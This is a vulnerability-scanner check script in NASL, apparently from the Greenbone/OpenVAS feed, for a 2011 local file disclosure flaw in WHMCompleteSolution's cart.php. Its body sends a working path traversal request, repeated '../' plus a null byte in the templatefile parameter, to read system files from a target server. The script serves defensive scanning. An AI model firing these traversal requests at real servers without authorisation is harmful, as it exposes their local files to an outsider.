if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103305" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2011-10-20 15:15:44 +0200 (Thu, 20 Oct 2011)" );
	script_bugtraq_id( 50280 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "WHMCompleteSolution 'cart.php' Local File Disclosure Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/50280" );
	script_xref( name: "URL", value: "http://whmcs.com/" );
	script_xref( name: "URL", value: "http://forum.whmcs.com/showthread.php?t=42121" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "The vendor has released updates. Please see the references for
details." );
	script_tag( name: "summary", value: "WHMCompleteSolution is prone to a local file-disclosure vulnerability
because it fails to adequately validate user-supplied input.

Exploiting this vulnerability would allow an attacker to obtain
potentially sensitive information from local files on computers
running the vulnerable application. This may aid in further attacks.

Versions prior to WHMCompleteSolution 4.5 are vulnerable." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/cart", "/shop", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	for file in keys( files ) {
		url = dir + "/cart.php?a=test&templatefile=" + crap( data: "../", length: 9 * 3 ) + files[file] + "%00";
		if(http_vuln_check( port: port, url: url, pattern: file, extra_check: "WHMCompleteSolution" )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

